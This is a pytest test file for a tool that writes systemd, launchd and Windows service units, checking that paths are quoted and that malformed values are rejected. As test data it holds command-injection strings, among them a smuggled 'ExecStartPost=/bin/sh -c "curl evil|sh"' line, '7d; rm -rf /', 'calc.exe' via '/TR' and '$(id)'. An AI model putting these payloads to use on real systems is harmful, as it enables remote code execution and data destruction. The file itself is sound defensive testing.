
from __future__ import annotations

import xml.dom.minidom

import pytest

from gitpulse.service import units as U

SPACED = "/home/me/My Repos/app"
NEWLINE_INJECTION = '/repo\nExecStartPost=/bin/sh -c "curl evil|sh"'


def _exec_line(service: str) -> str:
    return next(ln for ln in service.splitlines() if ln.startswith("ExecStart"))




def test_systemd_quotes_a_path_containing_spaces():
    _, service, _ = U.systemd_watch(SPACED, "1d", "7d", "slack")
    assert f'"{SPACED}"' in _exec_line(service)


def test_launchd_keeps_a_spaced_path_as_one_argument():
    _, plist, _ = U.launchd_watch(SPACED, "1d", "7d", "slack")
    assert f"<string>{SPACED}</string>" in plist


def test_windows_quotes_a_spaced_path():
    _, script, _ = U.windows_watch(r"C:\My Repos\app", "2h", "7d", "slack")
    assert r"\"C:\My Repos\app\"" in script


def test_systemd_web_quotes_every_token():
    _, service, _ = U.systemd_web("127.0.0.1", 8420)
    exec_line = _exec_line(service).removeprefix("ExecStart=")
    assert exec_line.split()[0].startswith('"')




@pytest.mark.parametrize(
    "generator",
    [U.systemd_watch, U.launchd_watch, U.windows_watch],
    ids=["systemd", "launchd", "windows"],
)
def test_newline_in_path_is_rejected(generator):
    with pytest.raises(U.UnitValueError):
        generator(NEWLINE_INJECTION, "1d", "7d", "slack")


def test_plist_stays_valid_xml_with_hostile_path():
    _, plist, _ = U.launchd_watch('/repo/<*>&"q"', "1d", "7d", "slack")
    xml.dom.minidom.parseString(plist)
    assert "&lt;*&gt;&amp;" in plist


def test_quote_in_windows_path_is_rejected_not_mangled():
    with pytest.raises(U.UnitValueError, match="double quote"):
        U.windows_watch('C:\\r" /TR "calc.exe', "1d", "7d", "slack")


def test_percent_is_escaped_for_systemd_specifiers():
    _, service, _ = U.systemd_watch("/repo/%h/app", "1d", "7d", "slack")
    assert "%%h" in _exec_line(service)




@pytest.mark.parametrize("when", ["7d; rm -rf /", "7d && curl x", "a b", "$(id)"])
def test_bad_when_is_rejected(when):
    with pytest.raises(U.UnitValueError):
        U.validate_when(when)


@pytest.mark.parametrize("when", ["7d", "24h", "2026-06-15", "yesterday..today", "30m"])
def test_good_when_is_accepted(when):
    assert U.validate_when(when) == when


@pytest.mark.parametrize("every", ["abc", "0m", "", "1y", "-3h", "3 h"])
def test_bad_every_is_rejected(every):
    with pytest.raises(U.UnitValueError):
        U.validate_every(every)


@pytest.mark.parametrize(
    "every,expected", [("30m", (30, "m")), ("2h", (2, "h")), ("1d", (1, "d"))]
)
def test_good_every_is_parsed(every, expected):
    assert U.validate_every(every) == expected


@pytest.mark.parametrize("to", ["", ",", "slack;curl", "sl ack", "-bad"])
def test_bad_channels_are_rejected(to):
    with pytest.raises(U.UnitValueError):
        U.validate_channels(to)


def test_channels_are_split_and_trimmed():
    assert U.validate_channels("slack, email ,desktop") == [
        "slack",
        "email",
        "desktop",
    ]


@pytest.mark.parametrize("port", [0, -1, 65536, 999999])
def test_bad_port_is_rejected(port):
    with pytest.raises((U.UnitValueError, ValueError)):
        U.validate_port(port)


@pytest.mark.parametrize("host", ["a b", "h;x", "h\nx", "$(id)"])
def test_bad_host_is_rejected(host):
    with pytest.raises(U.UnitValueError):
        U.validate_host(host)


def test_invalid_every_reports_a_clear_error_instead_of_crashing():
    with pytest.raises(U.UnitValueError, match="expected <number>"):
        U.launchd_watch("/r", "xyz", "7d", "slack")




def test_exe_argv_is_tokenised():
    argv = U._exe_argv()
    assert isinstance(argv, list) and argv
    assert all(isinstance(a, str) for a in argv)
